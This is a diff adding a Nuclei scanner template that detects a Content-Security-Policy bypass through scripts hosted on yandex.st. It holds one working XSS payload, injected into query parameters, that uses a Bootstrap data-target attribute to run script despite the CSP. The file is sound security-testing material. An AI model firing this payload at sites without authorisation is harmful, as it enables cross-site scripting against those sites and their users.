@@ -1,0 +1,55 @@
+id: yandex-st-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via Yandex ST
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,yandex-st
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "yandex.ru"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: yandex_st_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><script src="https://yandex.st/bootstrap/3.0.3/js/bootstrap.min.js"></script><button data-toggle="modal" data-target="$('head').html('<script>alert(1)</script>')">Test XSS</button>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "yandex_st_csp_xss == true"
+# digest: 490a004630440220529c0d56c53e1e5cd2df1c15a837799a3e69b62b52f551eee7cb579470c5794a02200b846edbd933f6d7019d071184eb99b2d8a06df97ccf96a09de1e619eaf75ded:922c64590222798bb761d5b6d8e72950
